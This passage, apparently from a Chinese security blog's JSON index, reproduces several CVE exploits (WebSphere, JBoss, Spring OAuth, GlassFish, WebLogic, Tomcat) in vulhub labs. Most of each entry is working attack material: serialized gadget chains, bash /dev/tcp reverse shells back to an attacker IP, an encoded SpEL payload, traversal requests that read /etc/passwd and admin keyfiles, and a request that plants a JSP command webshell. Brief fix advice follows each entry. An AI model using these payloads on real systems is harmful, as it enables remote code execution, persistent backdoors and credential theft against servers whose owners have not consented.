xsi:type=&quot;ns1:javax.management.ObjectName&quot;&gt;rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==&lt;/objectname&gt;&lt;operationname xsi:type=&quot;xsd:string&quot;&gt;getUnsavedChanges&lt;/operationname&gt;&lt;params xsi:type=&quot;ns1:[Ljava.lang.Object;&quot;&gt;&#123;rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB+AABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAVzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AHgAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+AB5zcQB+ABZ1cQB+ABsAAAACcHVxAH4AGwAAAAB0AAZpbnZva2V1cQB+AB4AAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAbc3EAfgAWdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAEHRvdWNoIC90bXAvaGVsbG90AARleGVjdXEAfgAeAAAAAXEAfgAjc3EAfgARc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAQdwgAAAAQAAAAAHh4dnIAEmphdmEubGFuZy5PdmVycmlkZQAAAAAAAAAAAAAAeHBxAH4AOg==&#125;&lt;/params&gt;&lt;signature xsi:type=&quot;ns1:[Ljava.lang.String;&quot;&gt;rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=&lt;/signature&gt;&lt;/ns1:invoke&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n\n\nSend后成功创建hello文件\n\n使用工具：\n利用工具下载地址：\nhttps://cdn.vulhub.org/deserialization/DeserializeExploit.jar\n\n\n\npython 脚本验证：\n下载地址：\nhttps://github.com/Coalfire-Research/java-deserialization-exploits/blob/main/WebSphere/websphere_rce.py\npython2 websphere_rce.py 192.168.3.91:8880 &#x27;touch /tmp/success&#x27; --proto http\n\n\n进入docker查看：\ndocker exec -ti 96313d719697 /bin/bashls -la /tmp/\n\n\n修复建议1、临时解决方法：\n如果您不能立刻安装补丁或者升级，NSFOCUS建议您采取以下措施以降低威胁：\n\n使用防火墙规则及文件系统访问限制\n使用 SerialKiller 替换进行序列化操作的 ObjectInputStream 类\n临时删除掉项目里的“org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;InvokerTransformer.class” 文件\n\n2、厂商补丁：\n目前厂商已经发布了升级补丁ACC 3.2.2 以修复这个安全问题，请到厂商的主页下载：https://commons.apache.org/proper/commons-collections/download_collections.cgihttp://svn.apache.org/viewvc?view=revision&amp;revision=1713307https://commons.apache.org/proper/commons-collections/https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread\n","categories":["漏洞复现"],"tags":["WebSphere"]},{"title":"CVE-2015-7501-JBoss-JMXInvokerServlet-Deserialization","url":"/2022/10/20/CVE-2015-7501-JBoss-JMXInvokerServlet-Deserialization/","content":"描述​\t这是经典的JBoss反序列化漏洞，JBoss在&#x2F;invoker&#x2F;JMXInvokerServlet请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。\n影响版本JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10JBoss AS (Wildly) 6 and earlierJBoss A-MQ 6.2.0JBoss Fuse 6.2.0JBoss SOA Platform (SOA-P) 5.3.1JBoss Data Grid (JDG) 6.5.0JBoss BRMS (BRMS) 6.1.0JBoss BPMS (BPMS) 6.1.0JBoss Data Virtualization (JDV) 6.1.0JBoss Fuse Service Works (FSW) 6.0.0JBoss Enterprise Web Server (EWS) 2.1,3.0\n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/jboss/JMXInvokerServlet-deserialization#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n复现过程利用工具下载地址：\nhttps://github.com/joaomatosf/JavaDeserH2HC\n\n通过一下命令可生成一个ser后缀的文件。\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.3.61:2233\n\n\n\nkali监听2233端口\nnc -lvvp 2233\n\n执行exp\ncurl http://192.168.3.50:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n修复建议1、升级版本\n2、不需要的http-invoker.sar组件,删除此组件\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"CVE-2016-4977-Spring-Security-OAuth-RCE","url":"/2022/11/03/CVE-2016-4977-Spring-Security-OAuth-RCE/","content":"描述​\tSpring Security OAuth是为Spring框架提供安全认证支持的一个模块，在7月5日其维护者发布了这样一个升级公告，主要说明在用户使用Whitelabel views来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。漏洞的发现者在10月13日公开了该漏洞的挖掘记录。\n影响版本Spring Security OAuth 2.3到2.3.2\nSpring Security OAuth 2.2到2.2.1\nSpring Security OAuth 2.1到2.1.1\nSpring Security OAuth 2.0到2.0.14\n漏洞检测发送一下请求，如果返回值中包含6则说明漏洞存在。\nhttp://192.168.3.109:8080/oauth/authorize?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test\n\n\n环境搭建使用vulhub的docker环境做复现：\ncd spring/CVE-2016-4977docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.109:8080/\n\n\n复现过程反弹shell\nbash -i &gt;&amp; /dev/tcp/192.168.3.61/2233 0&gt;&amp;1\n\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuNjEvMjIzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n\n使用vulnhub环境下面给的poc.py文件，构造payload。\n#!/usr/bin/env pythonmessage = input(&#x27;Enter message to encode:&#x27;)poc = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])for ch in message[1:]:   poc += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch) poc += &#x27;)&#125;&#x27;print(poc)\n\n\n用python3直接执行，然后输入反弹shell的语句。\n\n通过bp将刚才的$&#123;2*3&#125;更改为payload，kali提前监听，然后send。\n\nGET /oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(98).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(70)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(83)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(43)).concat(T(java.lang.Character).toString(74)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(90)).concat(T(java.lang.Character).toString(71)).concat(T(java.lang.Character).toString(86)).concat(T(java.lang.Character).toString(50)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(51)).concat(T(java.lang.Character).toString(82)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(67)).concat(T(java.lang.Character).toString(56)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(79)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(84)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(76)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(78)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(69)).concat(T(java.lang.Character).toString(118)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(106)).concat(T(java.lang.Character).toString(73)).concat(T(java.lang.Character).toString(122)).concat(T(java.lang.Character).toString(77)).concat(T(java.lang.Character).toString(121)).concat(T(java.lang.Character).toString(65)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(80)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(89)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(54)).concat(T(java.lang.Character).toString(52)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(100)).concat(T(java.lang.Character).toString(125)).concat(T(java.lang.Character).toString(124)).concat(T(java.lang.Character).toString(123)).concat(T(java.lang.Character).toString(98)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(44)).concat(T(java.lang.Character).toString(45)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(125)))&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test HTTP/1.1Host: 192.168.3.109:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateAuthorization: Basic YWRtaW46YWRtaW4=Connection: closeUpgrade-Insecure-Requests: 1\n\n\n获得反弹的会话\n\n修复建议1、使用1.0.x版本的用户应放弃在认证通过和错误这两个页面中使用Whitelabel这个视图\n2、使用2.0.x版本的用户升级到2.0.10以及更高的版本\n","categories":["漏洞复现"],"tags":["Spring"]},{"title":"CVE-2017-1000028-GlassFish-Directory-Traversal","url":"/2022/11/01/CVE-2017-1000028-GlassFish-Directory-Traversal/","content":"描述​\tGlassFish是一款 java编写的跨平台的开源的应用服务器。java语言中会把 %c0%ae解析为 \\uC0AE，最后转义为ASCCII字符的.（点）。利用 %c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;%c0%ae%c0%ae&#x2F;来向上跳转，达到目录穿越、任意文件读取的效果。所以 glassfish 这个 poc 实际上就是..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd。\n影响版本GlassFish&lt; 4.1.1（不含 4.1.1）\n漏洞检测访问以下URL，如果出现返回200则存在该漏洞。\nhttps://192.168.3.96:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\n\n\n环境搭建docker搭建环境：\ncd glassfish/4.1.0docker-compose up -d\n\n\n查看环境\nhttps://192.168.3.96:4848/\n\n\n复现过程使用bp抓包，发送以下payload\nGET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd HTTP/1.1Host: 192.168.3.96:4848Cookie: JSESSIONID=1c5a93a84f23b88ee0aaca3cc4e9; treeForm_tree-hi=User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailersConnection: close\n\n\n读取GlassFish存储admin账号密码的文件\nGET /theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/domains/domain1/config/admin-keyfile HTTP/1.1Host: 192.168.3.96:4848Cookie: JSESSIONID=1c5a93a84f23b88ee0aaca3cc4e9; treeForm_tree-hi=User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originTe: trailersConnection: close\n\n\n\n\nadmin;&#123;SSHA256&#125;e1KFmg/w1Je4SjjQkHEtEUG1db3Bjsu9/WAhJW+LIm8Z4bdb45WoAw==;asadmin\n\n\n\n修复建议1、关闭远程管理关闭远程管理，关闭后只允许本地访问，会提示要求输入用户名和密码，开发环境或者对服务器安全要求较高的环境可以选择这么做，修改该设置后应该重启 GlassFish 服务\n.&#x2F;asadmin change-admin-password .&#x2F;asadmin disable-secure-admin .&#x2F;asadmin stop-domain .&#x2F;asadmin start-domain asadmin.bat change-admin-password asadmin.bat disable-secure-admin asadmin.bat stop-domain asadmin.bat start-domain\n3、需要注意的是，关闭远程访问只能禁用远程 login 登录，但是攻击 url 还是可以访问，任意文件读取依然存在**2. IPtables 规则\niptables -I INPUT -p tcp –dport 4848 -m string –to 120 –algo bm –string ‘..%c0%af’ -j DROPiptables -I INPUT -p tcp –dport 4848 -m string –to 120 –algo bm –string ‘%c0%ae&#x2F;‘ -j DROPiptables -I INPUT -p tcp –dport 4848 -m string –to 120 –algo bm –string ‘..&#x2F;‘ -j DROP&#x2F;&#x2F;该规则无法防御HTTPS SSL方案\n2、禁用 web.xml theme 映射\\glassfish4\\glassfish\\lib\\install\\applications__admingui\\WEB-INF\\web.xml\n\n\n重启 glassfish 后生效\n","categories":["漏洞复现"],"tags":["GlassFish"]},{"title":"CVE-2017-10271-WebLogic-XMLDecoder-Deserialization","url":"/2022/10/25/CVE-2017-10271-WebLogic-XMLDecoder-Deserialization/","content":"描述​\tOracle官方4月份补丁对CVE-2017-3506该漏洞修复不彻底，可以绕过补丁，依旧执行远程命令。CVE-2017-10271目前绕过的漏洞在官方发布的10月份的补丁中已修复。\n影响版本Oracle WebLogic Server10.3.6.0.0 版本\nOracle WebLogic Server12.1.3.0.0 版本\nOracle WebLogic Server12.2.1.1.0 版本\nOracle WebLogic Server12.2.1.2.0 版本\n漏洞检测访问以下的目录中的一种，如果有回显就可以判断wls-wsat组件存在\nhttp://192.168.3.50:7001/wls-wsat/CoordinatorPortTypehttp://192.168.3.50:7001/wls-wsat/RegistrationPortTypeRPChttp://192.168.3.50:7001/wls-wsat/ParticipantPortTypehttp://192.168.3.50:7001/wls-wsat/RegistrationRequesterPortTypehttp://192.168.3.50:7001/wls-wsat/CoordinatorPortType11http://192.168.3.50:7001/wls-wsat/RegistrationPortTypeRPC11http://192.168.3.50:7001/wls-wsat/ParticipantPortType11http://192.168.3.50:7001/wls-wsat/RegistrationRequesterPortType11\n\n\n命令执行不回显，所以漏洞验证需要DNSlog服务器。\n环境搭建这里使用vulnhub搭建环境来复现漏洞。\n#进入漏洞目录cd vulhub/weblogic/CVE-2017-10271#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:7001/\n\n\n复现过程下面是上传一个cmdshell的完整数据包\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.50:7001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: JSESSIONID=0A43AA4825D3418A00E0548FEC113B9EUpgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 923&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[&lt;%   if(&quot;secfree&quot;.equals(request.getParameter(&quot;password&quot;)))&#123;          java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;command&quot;)).getInputStream();          int a = -1;          byte[] b = new byte[2048];          out.print(&quot;&lt;pre&gt;&quot;);          while((a=in.read(b))!=-1)&#123;              out.println(new String(b));          &#125;          out.print(&quot;&lt;/pre&gt;&quot;);      &#125; %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;&lt;/object&gt;&lt;/java&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;\n\n\n发送后通过bp访问一下地址：\n\n\n\n修复建议1.升级Oracle 10月份补丁。\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html https://lipeng1943.com/download/weblogic_patch-catalog_25504.zip\n\n2.对访问wls-wsat的资源进行访问控制。\n3.临时解决方案\n在不影响业务前提下，根据实际环境路径，删除WebLogic程序下列war包及目录。\nrm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.warrm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.warrm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat\n\n\n重启WebLogic服务或系统后，确认以下链接访问是否为404：\nhttp://ip:port/wls-wsat/CoordinatorPortType11\n\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2017-12149-JBoss-5-6-Deserialization","url":"/2022/10/20/CVE-2017-12149-JBoss-5-6-Deserialization/","content":"描述​\t该漏洞位于JBoss的HttpInvoker组件中的 ReadOnlyAccessFilter 过滤器中，其doFilter方法在没有进行任何安全检查和限制的情况下尝试将来自客户端的序列化数据流进行反序列化，导致攻击者可以通过精心设计的序列化数据来执行任意代码。\n影响版本Jboss 5.x-6.x\n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/jboss/CVE-2017-12149#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:8080/\n\n\n复现过程利用工具下载地址：\nhttps://github.com/joaomatosf/JavaDeserH2HC\n\n通过一下命令可生成一个ser后缀的文件。\njavac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.javajava -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 192.168.3.61:2233\n\n\nkali监听2233端口\nnc -lvvp 2233\n\n\n执行exp\ncurl http://192.168.3.50:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n\n\n\n\n\n修复建议1、升级版本\n2、不需要的http-invoker.sar组件,删除此组件\n","categories":["漏洞复现"],"tags":["JBoss"]},{"title":"CVE-2017-12615-Tomcat-RCE","url":"/2022/10/18/CVE-2017-12615-Tomcat-RCE/","content":"描述​\t当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。\n影响版本Apache Tomcat 7.0.0 - 7.0.79 \n环境搭建使用vulhub搭建漏洞环境\n#进入漏洞目录cd vulhub/tomcat/CVE-2017-12615/#开启环境docker-compose up -d\n\n\n查看配置文件\n#查看镜像docker ps#进入镜像环境docker exec -ti 80403f2f1367 bash\n\n\n查看环境\nhttp://192.168.2.107:8080/\n\n\n复现过程​\t使用bp抓包，使用PUT将后门文件上传到网站的根目录下，这里需要在文件名后加上/。\n\n​\t使用AntSword连接上传的后门。\n\n\n\n修复建议1、设置conf&#x2F;webxml 文件的 readOnly 值为 Ture 或注释参数。\n2、禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。）\n3、升级到最新版本。\n4、使用WAF产品进行防御。\n","categories":["漏洞复现"],"tags":["Tomcat"]},{"title":"CVE-2017-3506-WebLogic-XMLDecoder-Deserialization","url":"/2022/10/25/CVE-2017-3506-WebLogic-XMLDecoder-Deserialization/","content":"描述​\t在&#x2F;wls-wsat&#x2F;CoordinatorPortType（POST）处构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。\n影响版本Oracle WebLogic Server10.3.6.0.0\nOracle WebLogic Server12.1.3.0.0\nOracle WebLogic Server12.2.1.1.0\nOracle WebLogic Server12.2.1.2.0\n漏洞检测访问以下的目录中的一种，如果有回显就可以判断wls-wsat组件存在\nhttp://192.168.3.50:7001/wls-wsat/CoordinatorPortTypehttp://192.168.3.50:7001/wls-wsat/RegistrationPortTypeRPChttp://192.168.3.50:7001/wls-wsat/ParticipantPortTypehttp://192.168.3.50:7001/wls-wsat/RegistrationRequesterPortTypehttp://192.168.3.50:7001/wls-wsat/CoordinatorPortType11http://192.168.3.50:7001/wls-wsat/RegistrationPortTypeRPC11http://192.168.3.50:7001/wls-wsat/ParticipantPortType11http://192.168.3.50:7001/wls-wsat/RegistrationRequesterPortType11\n\n\n命令执行不回显，所以漏洞验证需要DNSlog服务器。\n环境搭建这里使用vulnhub上面WebLogic weak_password的环境来复现该漏洞。\n#进入漏洞目录cd vulhub/weblogic/weak_password#开启环境docker-compose up -d\n\n\n查看环境\nhttp://192.168.3.50:7001/\n\n\n复现过程反弹shell完整数据包\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.50:7001User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: JSESSIONID=0A43AA4825D3418A00E0548FEC113B9EUpgrade-Insecure-Requests: 1Content-Type: text/xmlContent-Length: 1278&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;                  xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;                  xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;    &lt;soapenv:Header&gt;        &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;        &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;            &lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;                &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;                        &lt;void index=&quot;0&quot;&gt;                            &lt;string&gt;/bin/bash&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;1&quot;&gt;                            &lt;string&gt;-c&lt;/string&gt;                        &lt;/void&gt;                        &lt;void index=&quot;2&quot;&gt; &lt;string&gt;/bin/bash -i &amp;gt; /dev/tcp/192.168.3.61/3344 0&amp;lt;&amp;amp;1 2&amp;gt;&amp;amp;1&lt;/string&gt;                        &lt;/void&gt;                    &lt;/array&gt;                    &lt;void method=&quot;start&quot;/&gt;                &lt;/object&gt;            &lt;/java&gt;        &lt;/work:WorkContext&gt;    &lt;/soapenv:Header&gt;    &lt;soapenv:Body&gt;        &lt;asy:onAsyncDelivery/&gt;    &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;\n\nkali监听,通过bp发送post请求，kali接收到反弹过来的shell。\nnc -lvvp 3344\n\n\n\n\n修复建议1.升级Oracle 10月份补丁。\nhttp://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html https://lipeng1943.com/download/weblogic_patch-catalog_25504.zip\n\n2.对访问wls-wsat的资源进行访问控制。\n3.临时解决方案\n在不影响业务前提下，根据实际环境路径，删除WebLogic程序下列war包及目录。\nrm -f/home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.warrm -f/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.warrm -rf/home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat\n\n\n重启WebLogic服务或系统后，确认以下链接访问是否为404：\nhttp://ip:port/wls-wsat/CoordinatorPortType11\n\n","categories":["漏洞复现"],"tags":["WebLogic"]},{"title":"CVE-2017-4971-Spring-Web-Flow-RCE","url":"/2022/11/04/CVE-2017-4971-Spring-Web-Flow-RCE/","content":"描述​\tSpring WebFlow 